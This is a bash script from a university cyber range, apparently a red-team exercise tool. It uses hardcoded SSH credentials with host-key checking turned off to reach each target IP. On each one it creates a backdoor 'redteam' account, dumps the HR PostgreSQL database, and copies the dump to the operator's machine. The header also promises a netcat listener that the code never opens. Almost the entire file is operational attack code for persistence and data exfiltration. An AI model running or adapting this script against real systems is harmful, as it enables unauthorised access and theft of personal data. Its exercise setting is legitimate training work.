#!/bin/bash
<<COMMENT

=============================================================================

 Central Texas Cyber Range (CTCR)

=============================================================================

 Maker:       Ethan Vowels

 Maintainer:  Ethan Vowels

 Project:     CIIRC

 Filename:    connectAndPersist.sh

Git: Abanisenioluwa_oroj1

 Description:

    This script will connect to each client multiple times using ssh, it will create a redteam account, extract a database, and open a netcat listener

 Extension Principle:

    None

 License:

    MIT

 Additional Information:

    - Date Created: 5/17/2024

    - Last Updated: 5/17/2024

    - Contact: ethan_vowels1@baylor.edu

    - Repository: Gitlab CIIRC Hack

=============================================================================

COMMENT

# Ensure this script is run with IP addresses as arguments
if [ $# -lt 1 ]; then
  echo "Usage: $0 <IP_Address1> [IP_Address2] ..."
  exit 1
fi

# Collect all IP addresses provided as arguments
TARGET_IPS=("$@")

# SSH User and Password
SSH_USER="hr"
SSH_PASS="MegaBiteRules23!"

# New user to be created on the target system for demonstration purposes
NEW_USER="redteam"
NEW_USER_PASS="InTheMainframe"

# Local file to simulate exfiltration
FILE_TO_EXFILTRATE="/home/hr/db_dump.sql"
DESTINATION_PATH="/home/cybears"

# Loop through each IP address provided
for TARGET_IP in "${TARGET_IPS[@]}"; do
  echo "Processing target: $TARGET_IP"
  
  # Check if the user already exists
  sshpass -p "$SSH_PASS" ssh -o StrictHostKeyChecking=no $SSH_USER@"$TARGET_IP" << EOF
  # Delete existing user (if exists)
  sudo deluser redteam

  # Add new user and set password
  sudo useradd -m $NEW_USER
  echo "$NEW_USER:$NEW_USER_PASS" | sudo chpasswd
EOF
  
  # Creating db_dump
  echo "Creating db_dump on target system..."
  sshpass -p "$SSH_PASS" ssh -o StrictHostKeyChecking=no $SSH_USER@"$TARGET_IP" "echo '$SSH_PASS' | sudo -S -u $SSH_USER pg_dump -h localhost -d hr -f $FILE_TO_EXFILTRATE"
  
  # Simulate exfiltration of 'db_dump.txt'
  echo "Simulating exfiltration of $DUMP_PATH from target..."
  sshpass -p "$SSH_PASS" scp -o StrictHostKeyChecking=no $SSH_USER@"$TARGET_IP":"$FILE_TO_EXFILTRATE" "$DESTINATION_PATH"
  
  echo "Done with target: $TARGET_IP"
done
